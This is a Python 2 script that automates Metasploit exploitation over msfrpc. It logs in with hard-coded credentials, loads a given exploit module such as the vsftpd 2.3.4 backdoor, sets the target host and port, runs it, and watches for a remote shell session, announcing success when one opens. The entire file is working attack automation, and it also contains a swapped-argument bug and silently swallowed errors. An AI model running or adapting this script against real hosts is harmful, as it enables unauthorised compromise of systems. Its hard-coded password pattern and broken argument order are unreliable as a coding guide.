#!/usr/bin/env python
import sys
import msfrpc
import time
import uuid
from colorama import init
from colorama import Fore, Back, Style

init()
#https://gist.github.com/carnal0wnage/5f5f64432738fc25c538
#much thanks sir was really a big help

def metasploit_fun(RPORT,RHOSTS,exploit):
    # Create a new instance of the Msfrpc client with the default options
        client = msfrpc.Msfrpc({})
        print "In Metasploit Fun"

    # Login to the msf server using the password "abc123"
        client.login(user='msf', password='abc123')
        try:
           if "vsftpd_234_backdoor" in exploit:
              res = client.call('console.create')
              #print(res)
              console_id = res['id']
              #print("res: %s" %res)
              time.sleep(1)
              #a = client.call('console.write', [console_id, "workspace -a " + str(session) + "\n"])
              time.sleep(1)
              a = client.call('console.write', [console_id, "set THREADS 1\n"])
              time.sleep(1)
              #a = client.call('console.write', [console_id, """workspace """+str(session)+"\n"])
              time.sleep(1)
              a = client.call('console.write', [console_id,"""use """+str(exploit)+"\n"])
              time.sleep(1)
              a = client.call('console.write', [console_id, """set RHOST """+RHOSTS+"\n"])
              time.sleep(1)
              a = client.call('console.write', [console_id, """set CPORT """ + str(RPORT)+"\n"])
              time.sleep(1)
              a = client.call('console.write', [console_id, "exploit -z\n"])
              time.sleep(5)
    
              while True:
                    res = client.call('console.read',[console_id])
                    if len(res['data']) > 1:
                       if "created in the background" in res['data']:
                          print(res['data'],)
                          print "SuccesFull Shell Sir Host Engaged Bonesaw Complete"
                       break

                    if res['busy'] == True:
                       time.sleep(1)
                       continue

           else:
                try:
                   standard_exploitation(RPORT,RHOSTS,exploit)                   
                except:
                   pass
        except:
               pass


def standard_exploitation(exploit,RHOST,RPORT):
    try:
        client = msfrpc.Msfrpc({})
        print "In Metasploit Standard Exploit Routine"
        # Login to the msf server using the password "abc123"
        client.login(user='msf', password='abc123')
        print exploit
        res = client.call('console.create')
        print(res)
        console_id = res['id']
        print("res: %s" %res)
        time.sleep(1)
        a = client.call('console.write', [console_id, "set THREADS 1\n"])
        time.sleep(1)
        a = client.call('console.write', [console_id,"""use """+exploit+"\n"])
        time.sleep(1)
        a = client.call('console.write', [console_id, """set RHOST """+RHOST+"\n"])
        time.sleep(1)
        a = client.call('console.write', [console_id, """set RPORT """ + str(RPORT)+"\n"])
        time.sleep(1)
        a = client.call('console.write', [console_id, "exploit -z\n"])
        time.sleep(5)
    
        while True:
                   res = client.call('console.read',[console_id])
                   if len(res['data']) > 1:
                      if "created in the background" in res['data']:
                         print(res['data'],)
                         print "SuccesFull Shell Sir Host Engaged Bonesaw Complete"
                      break
                     
                      if not "created in the background" in res['data']:
                         print(res['data'],)
           

                   if res['busy'] == True:
                      time.sleep(1)
                      continue
        
    except:
          pass       
